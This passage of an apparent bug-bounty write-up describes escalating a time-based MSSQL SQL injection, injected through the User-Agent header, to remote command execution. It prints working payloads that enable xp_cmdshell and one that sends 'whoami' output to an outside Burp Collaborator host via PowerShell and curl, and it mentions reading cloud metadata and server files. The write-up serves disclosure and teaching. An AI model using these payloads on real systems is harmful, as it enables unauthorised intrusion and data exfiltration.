# :globe_with_meridians: How I Escalated A Time Based Sql Injection To Rce Bbf0D68Cb398

---

## Escalating SQL Injection to RCE

Since we know that we can stack queries, let’s find a way to execute OS commands here. Unlike MySQL, MSSQL offers a way to execute commands. I based on this writeup by

## Get 0xEchidonut’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

I just found out that we can exec OS commands using `xp_cmdshell`, so I enabled xp_cmdshell in their server

`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36*'; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE;--*`

Then I tested for a blind RCE using `ping`

`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36*'; EXEC xp_cmdshell 'ping myburpcollablink.burpcollaborator.net';--*`

Boom! We got hits on or Burpsuite Collaborator Client. This confirms that we can do RCE.

Unlike the writeup above that stores the command output in the database, I made a non-destructive way to read OS Command outputs.

I made this by assigning the output to a `variable` in `powershell` and sending them to my BurpCollaborator using `curl`

It works like this:
`powershell -c “$x = whoami; curl [http://my-burp-link.burpcollaborator.net/get?output=$x](http://ryt2vq7j7b3jlk4zeilrk5hm7dd51u.burpcollaborator.net/get?output=%24x)”`

The command above gets the output of `whoami` and sends them to my burpcollab link

The final RCE payload looks like this:

`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36*';EXEC xp_cmdshell ‘powershell -c “$x = whoami; curl *[http://my-burp-link.burpcollaborator.net/get?output=$x](http://gn76thrltjpf9j5jccvusaxpggm7aw.burpcollaborator.net/get?output=%24x)*"';--*`

The command output got sent back to me as expected

I was also able to retrieve their `AWS EC2 instances’ metadata information`, see server files, and more.

---
